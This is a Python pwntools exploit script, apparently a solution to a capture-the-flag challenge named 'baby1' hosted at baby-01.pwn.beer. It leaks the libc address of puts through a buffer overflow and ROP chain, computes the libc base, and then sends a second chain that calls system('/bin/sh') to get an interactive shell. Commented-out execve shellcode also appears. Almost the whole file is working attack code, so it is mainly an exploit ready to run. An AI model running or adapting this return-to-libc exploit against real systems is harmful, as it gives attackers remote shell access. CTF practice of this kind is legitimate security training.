from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'

#execve(2) on x64
#shellcode = '\x48\x31\xd2\x52\x48\xb8\x2f\x62'\
#			 '\x69\x6e\x2f\x2f\x73\x68\x50\x48'\
#			 '\x89\xe7\x52\x57\x48\x89\xe6\x48'\
#			 '\x8d\x42\x3b\x0f\x05'
				
HOST = "baby-01.pwn.beer"
PORT = 10002

conn = None

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process('./baby1')

binsh_off = 0x1b3e9a
puts_off = 0x809c0
system_off = 0x4f440

puts_got = 0x601fc8
puts_plt = 0x400550
rdi_ret = 0x400783
banner = 0x400687
bufsize = 0x10 + 8
main = 0x400698

payload = "A"*bufsize
payload += p64(rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)


conn.recvuntil("input: ")
conn.sendline(payload)

ret = conn.recvline()
ret = ret[0:len(ret)-1]
ret = ret + "\x00"*(8 - len(ret))
puts_libc = u64(ret)
libc_base = puts_libc - puts_off
system_libc = libc_base + system_off
binsh = binsh_off + libc_base 

conn.recvuntil("input: ")

payload = "B"*bufsize
payload += p64(banner)
payload += p64(rdi_ret)
payload += p64(binsh)
payload += p64(system_libc)

conn.sendline(payload)
conn.interactive()
